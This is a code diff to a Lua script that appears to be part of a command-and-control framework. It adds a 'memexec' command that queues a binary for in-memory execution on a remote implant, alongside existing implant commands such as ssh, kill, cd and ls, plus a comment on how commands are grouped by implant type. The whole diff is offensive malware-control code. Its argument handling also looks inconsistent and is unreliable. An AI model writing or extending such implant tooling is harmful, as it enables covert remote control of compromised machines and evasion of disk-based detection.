@@ -6,7 +6,8 @@ CODE = {
     KILL = 5,
     CD = 6,
     PWD = 7,
-    LS = 8
+    LS = 8,
+    MEMEXEC = 9
 }
 
 function ping(payload)
@@ -98,6 +99,24 @@ function ls(payload)
     end
 end
 
+function memexec(payload)
+    local c = 0
+    local lcs = {}
+    for token in string.gmatch(payload, "[^%s]+") do 
+        lcs[c] = token
+        c=c+1
+    end
+    if #lcs ~= 1 then
+        print("problem")
+        return
+    end
+
+    local err = add_task_upload_file(CODE.MEMEXEC, lcs[0], lcs[1])
+    if err then
+        print("Error")
+    end
+end
+
 
 --[[
 implant_register_profile("linux-beacon", {
@@ -110,6 +129,16 @@ implant_register_profile("linux-beacon", {
 })
 ]]
 
+--[[
+The first argument of "command("impl","ping","Ping the implant", ping)" is the type of implant. Since the
+C2 may be dealing with many times of implants that must be different (windows implant, linux, IoT), 
+it is used for the C2 show commands that are handled by that type of implant (impl in this case).
+So just command handled by the impl implant type will be shown to the used, when interacting
+with a impl implant type.
+
+The implant must presents itself's type
+]]
+
 -- type, name, desc, func
 command("impl","ping","Ping the implant", ping)
 command("impl","ssh","Get an interactive session", ssh)
@@ -119,6 +148,7 @@ command("impl","kill","Kill implant", kill)
 command("impl","pwd","Get working dir", pwd)
 command("impl","cd","Change dir", cd)
 command("impl","ls","List dir", ls)
+command("impl","memexec","Execute binary in memory", memexec)
 
 --[[
 function OnRegister(...)
